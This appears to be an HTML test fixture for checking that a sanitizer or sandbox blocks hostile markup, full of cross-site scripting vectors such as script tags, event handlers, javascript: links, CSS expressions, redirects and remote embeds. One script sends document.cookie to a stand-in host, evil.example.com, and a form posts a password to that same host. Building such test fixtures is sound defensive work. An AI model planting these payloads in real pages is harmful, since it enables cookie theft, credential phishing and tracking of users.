<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="0;url=https://evil.example.com">
<base href="https://evil.example.com/">
<script>window.top.location = 'https://evil.example.com/pwned'; alert('xss-head');</script>
<style>
  body { background: url("https://evil.example.com/css-track.png"); }
  .x { behavior: url(evil.htc); width: expression(alert(1)); -moz-binding: url("https://evil.example.com/x.xml#xss"); }
  @import "https://evil.example.com/import.css";
  .ok { color: #0a0; font-weight: bold; }
  a > b { color: red; }
</style>
</head>
<body onload="alert('body-onload')">
  <h1 class="ok">Hostile content test</h1>
  <p>If you see an alert, a form submit, a navigation, or any external request, the sandbox failed.</p>
  <script>alert('xss-body'); fetch('https://evil.example.com/exfil?c=' + document.cookie);</script>
  <img src="x" onerror="alert('img-onerror')">
  <img src="https://evil.example.com/pixel.gif" width="1" height="1">
  <svg onload="alert('svg-onload')"><script>alert('svg-script')</script><a xlink:href="javascript:alert(1)"><text x="0" y="15">svg link</text></a></svg>
  <a href="javascript:alert('js-href')">javascript: link</a>
  <a href="https://acme.test/reset-password?token=SECRET123">Reset password link (should be listed in Links)</a>
  <form action="https://evil.example.com/steal" method="post"><input name="password" value="hunter2"><button>Submit</button></form>
  <iframe src="https://evil.example.com/frame"></iframe>
  <object data="https://evil.example.com/obj.swf"></object>
  <embed src="https://evil.example.com/embed.swf">
  <div style="background:url('https://evil.example.com/inline-css.png');color:#0a0;padding:8px;border-radius:8px">inline style with remote url</div>
  <math><mi xlink:href="javascript:alert(1)">math</mi></math>
  <a href="cid:not-an-image">cid link</a>
  <p><b>Safe formatting</b> should <i>survive</i>: <span class="ok">green bold</span>.</p>
</body>
</html>
